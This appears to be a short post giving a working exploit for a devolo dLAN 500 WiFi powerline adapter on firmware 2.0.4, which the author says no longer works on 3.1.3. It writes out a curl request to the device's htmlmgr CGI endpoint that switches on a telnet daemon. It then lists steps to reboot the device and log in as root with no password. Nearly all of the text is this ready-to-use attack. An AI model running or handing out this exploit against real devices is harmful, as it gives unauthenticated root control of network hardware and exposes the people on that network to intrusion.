This was tested on 2.0.4 on a dLAN 500 WiFI. This exploit doesn't work anymore on 3.1.3. I don't know when this was fixed.

Here we go:

    curl 'http://IPGOESHERE/cgi-bin/htmlmgr' -H 'Content-Type: application/x-www-form-urlencoded' --data '%3Asys%3ASystem.Baptization.Telnetd=1'

Wait 30 seconds.

Powercycle your devolo. I.e. pull it from the power outlet and replug.

Wait until it boots.

Telnet into your devolo.

Username: root

It will not ask for a password
